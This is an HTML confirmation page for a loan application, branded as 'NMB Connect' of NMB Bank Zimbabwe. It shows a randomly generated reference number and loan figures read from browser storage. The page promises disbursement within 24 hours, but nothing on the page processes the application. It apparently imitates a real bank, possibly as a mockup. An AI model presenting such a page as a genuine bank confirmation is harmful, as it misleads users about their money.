<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NMB Connect - Application Success</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
        * { font-family: 'Inter', sans-serif; }
        body { background: linear-gradient(135deg, #004a99 0%, #003366 100%); min-height: 100vh; }
        .glass-effect { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px); }
        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4 py-10">
    <div class="w-full max-w-sm fade-in">
        <!-- Header -->
        <div class="text-center mb-6">
            <div class="flex items-center justify-center gap-1 mb-2">
                <span class="text-3xl font-black text-white tracking-tighter">NMB</span>
                <span class="text-3xl font-black text-[#f2a900] tracking-tighter">Connect</span>
            </div>
            <p class="text-white/80 text-[10px] font-bold uppercase tracking-[0.3em]">Confirmation</p>
        </div>

        <!-- Main Card -->
        <div class="glass-effect rounded-3xl shadow-2xl overflow-hidden">
            <!-- Title Section -->
            <div class="bg-gradient-to-r from-[#003366] to-[#004a99] p-6 text-center">
                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Success!</h1>
                <p class="text-white/70 text-[10px] font-bold uppercase tracking-widest">Application Submitted</p>
            </div>

            <!-- Content -->
            <div class="p-6 sm:p-8 space-y-6 text-center">
                <div class="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto shadow-inner border border-green-100">
                    <i class="fas fa-check text-4xl text-green-500"></i>
                </div>

                <div class="space-y-1">
                    <p class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Reference Number</p>
                    <p class="text-xl font-mono font-black text-[#003366]" id="refNum">NMB-XXXX-XXXX</p>
                </div>

                <div class="bg-gray-50 rounded-2xl p-5 space-y-3 border border-gray-100 text-left">
                    <div class="flex justify-between items-center">
                        <span class="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Amount</span>
                        <span class="font-black text-base text-[#003366]" id="finalAmount">$500</span>
                    </div>
                    <div class="h-px bg-gray-200 w-full"></div>
                    <div class="flex justify-between items-center">
                        <span class="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Monthly Pay</span>
                        <span class="font-black text-base text-[#003366]" id="finalMonthly">$43.49</span>
                    </div>
                </div>

                <div class="bg-blue-50/50 border border-blue-100 rounded-2xl p-4">
                    <p class="text-[10px] text-gray-600 font-bold leading-relaxed uppercase tracking-tight">
                        <i class="fas fa-info-circle text-[#003366] mr-1"></i>
                        Funds will be disbursed to your account within 24 hours.
                    </p>
                </div>

                <button onclick="backToHome()" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
                    Return Home <i class="fas fa-home ml-2"></i>
                </button>
            </div>
        </div>

        <!-- Footer -->
        <p class="text-center text-white/50 text-[10px] mt-8 font-bold uppercase tracking-widest">
            © 2026 NMB Bank Zimbabwe | Application Complete
        </p>
    </div>

    <script>
        const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
        const session = JSON.parse(localStorage.getItem('nmb_session') || '{}');
        
        document.getElementById('finalAmount').textContent = `$${parseFloat(loanData.amount || 0).toLocaleString()}`;
        document.getElementById('finalMonthly').textContent = loanData.monthly || '$0.00';

        const randomRef = 'NMB-' + Math.floor(1000 + Math.random() * 9000) + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
        document.getElementById('refNum').textContent = randomRef;

        function backToHome() {
            localStorage.clear();
            window.location.href = 'index.html';
        }

        confetti({
            particleCount: 150,
            spread: 70,
            origin: { y: 0.6 },
            colors: ['#003366', '#f2a900', '#22c55e']
        });
    </script>
</body>
</html>
